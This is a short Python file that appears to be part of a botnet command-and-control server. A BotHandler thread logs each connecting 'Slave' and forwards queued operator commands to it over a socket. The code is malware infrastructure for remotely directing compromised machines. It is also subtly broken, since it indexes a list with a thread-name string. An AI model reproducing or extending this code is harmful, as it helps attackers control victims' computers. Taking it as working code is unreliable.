import threading

class BotHandler(threading.Thread):
    def __init__(self, client, clientAddress, qv):
        threading.Thread.__init__(self)
        self.client = client
        self.clientAddress = clientAddress
        self.ip = clientAddress[0]
        self.port = clientAddress[1]
        self.q = qv
        self.clientList=[]
    
    def run(self):
        botName = threading.current_thread().getName()
        print("[*] Slave " + self.ip + " : " + str(self.port) + " connected with Thread-ID : ", botName)
        
        self.clientList[botName] = self.clientAddress
        while True:
            recvBotCmd = self.q.get()
            try:
                self.client.send(recvBotCmd.encode("utf-8"))
            except Exception as ex:
                print(ex)
                break